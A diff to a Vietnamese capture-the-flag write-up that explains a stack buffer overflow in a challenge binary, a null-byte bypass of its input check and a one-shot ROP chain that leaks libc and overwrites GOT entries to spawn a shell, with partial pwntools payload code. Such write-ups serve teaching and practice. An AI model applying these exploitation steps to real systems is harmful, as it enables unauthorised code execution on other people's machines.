@@ -305,6 +305,8 @@ Hàm này tương tự hàm `htb`, khác ở chỗ kiểm tra `data` đầu vào
 
 ## Thinking
 
+### Bug
+
 Ban đầu reverse xong mình dễ dàng nhận ra lỗi buffer overflow ở cả 2 hàm là `bth` và `htb`.
 
 ```c
@@ -326,6 +328,8 @@ if ( unk_4080 && !strcmp((const char *)(unk_4080 + 4LL), (const char *)(a1 + 4))
 Tiếp đến ta cần nhìn sơ qua về cơ chế kiểm tra `data` hợp lệ, cơ chế này dựa trên hàm `strlen` (dừng ở nullbyte) nhưng khi dùng lại gọi đến `memcpy` (copy cả nullbyte), vì thế ta có thể dễ dàng bypass nếu ta kết thúc chuỗi sớm bằng '\x00', lúc này ta có thể điền các byte khác không hợp lệ vào vùng `data` sau đó nó được copy sang stack bằng `memcpy`
 
 Tuy nhiên mình ngay lập tức nhận ra vấn đề, đó là khi ta overflow, ta sẽ đè qua biến `k` dùng cho vòng lặp, từ đó flow chương trình sẽ thay đổi, ta cần bypass nó, một cách đơn giản đó là đè lại biến `k` thành (elf.address + 0x4070), khí đó `k->next` sẽ trở về struct ban đầu của ta và tiến hành loop tiếp đến khi dừng.
+
+### Exploit thinking
 
 Bài này là bài mình tốn thời gian lâu nhất trong khi giải (chắc tầm 3 tiếng) và sau đó vì submit quá trễ mà team mình đã đứng sau trường Duy Tân mặc dù cùng điểm, đó là điều mình khá buồn vì bài này không khó đến vậy. Đó là do một lỗi cực ngớ ngẫn của mình, mặc dù có bug giống nhau nhưng hàm `htb` lại cực kì dễ khai thác còn `bth` thì lại cực kì khó, lí do như sau:
 
@@ -373,6 +377,27 @@ Bài này là bài mình tốn thời gian lâu nhất trong khi giải (chắc 
   int i; // [rsp+D8h] [rbp-18h]
   unsigned int v18; // [rsp+DCh] [rbp-14h]
 ```
+
+Ở hàm `htb`, biến `k` dùng để lặp nằm ở offset `rbp-0x40`, ở hàm `bth` thì nó nằm ở `rbp-0x30`, cả 2 hàm đều bắt đầu copy chuỗi vào mảng `s` tại offset `rbp-0xc0`
+
+![image](https://user-images.githubusercontent.com/57558487/196630881-c30303bc-71c7-4881-8305-dc9341bb49c4.png)
+
+Nếu ta dùng hàm `bth`, `data` dùng để đè biến `k` nằm ở đầu mảng, khiến cho ta rất khó bypass check data, ngược lại nếu dùng hàm `htb`, nó rất dễ vì ta chỉ cần dùng NULL byte đầu mảng, sau đó đè giá trị tùy thích vào vùng biến `k`. Mình đã tốn quá nhiều thời gian tìm cách bypass và exploit ở hàm `bth` mà không check đến hàm `htb`, vì mình nghĩ 2 hàm tương tự nhau, cho đến khi mình vô tình click nhầm hàm và thấy sự khác biệt của offset :))). 
+
+Okey vậy plan khá clear rồi, dùng lỗi `bof` ở hàm `htb`, overflow, đè giá trị `k` về lại `elf.address + 0x4070`, sau đó loop và đè lên return address. Chú ý bypass check data bằng cách dùng NULL byte ở đầu mảng.
+
+Sau khi đè được return address, mình quyết định build one time ROPChain vì khó mà có thể quay lại để exploit lần nữa, vì `unk_4080` đã thay đổi, vì thế flow ropchain của mình như sau:
+
+```
+puts(puts.got) -> read(0, malloc.got, 0x100) -> overwrite {
+	malloc.got: /bin/sh,
+	atoi.got: system
+} -> atoi(malloc.got)
+```
+
+Đầu tiên gọi đến `puts(puts.got)` để leak địa chỉ libc, sau đó gọi đến `read` để đè lên `malloc.got`, vì `malloc.got` và `atoi.got` nằm kề nhau, mình sẽ đè lần lượt `malloc.got` thành chuỗi "/bin/sh" và `atoi.got` bằng địa chỉ của `system`, sau đó trigger bằng gọi gọi hàm `atoi.plt` với tham số là địa chỉ got của `malloc`, nơi chứa chuỗi "/bin/sh" -> `system("/bin/sh")`
+
+Bài này khá strict do chúng ta vừa phải build one_time ropchain vừa phải bypass các điều kiện check của data, vừa phải đè lên biến `k` hợp lí, vì thế mình cần phải khéo léo thiết lập payload và kết hợp cả kĩ thuật `ret2csu` vào để tạo ra payload.
 
 ## Exploit
 
@@ -461,12 +486,6 @@ payload = b'\x00' + b'a' * 7 + p64(ret)
 payload += p64(pop_rdi) + p64(elf.got['puts'])
 payload += p64(elf.symbols['puts']) + p64(pop_rdi)
 s.send(b'1   htb\x00' + payload)
-
-# raw_input('DEBUG')
-# payload = b'\x00' + b'a' * 7 + p64(0)
-# payload += p64(1) + p64(0)
-# payload += p64(elf.got['exit']) + p64(0x20)
-# s.send(b'1   htb\x00' + payload)
 
 time.sleep(0.1)
 payload = b'\x00' + b'a' * 7 + p64(pop_rsi_r15)
